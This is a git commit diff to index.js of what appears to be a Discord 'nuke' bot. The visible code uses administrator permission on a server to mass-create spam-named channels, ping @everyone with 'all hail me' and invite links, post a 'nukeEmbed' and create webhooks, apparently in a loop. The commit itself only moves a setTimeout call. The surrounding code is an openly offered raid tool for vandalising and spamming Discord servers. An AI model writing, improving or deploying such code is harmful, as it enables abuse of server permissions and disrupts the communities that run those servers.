af06496b0181708dcc309629a260a2563991c75f
ass-123 <67277806+ass-123@users.noreply.github.com>
2020-11-30 15:11:02 +0100

    Update index.js

--- index.js
+++ index.js
@@ -384,6 +384,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
         var number = 0
         var pray = -1
+        setTimeout(() => { 
            msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/hKVK9r7DGt @everyone")
@@ -423,7 +424,6 @@ channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`))
 channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
 })
              })
-        setTimeout(() => { 
           while(pray < 2) {
          msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
             p.createWebhook("assy").then(w => {
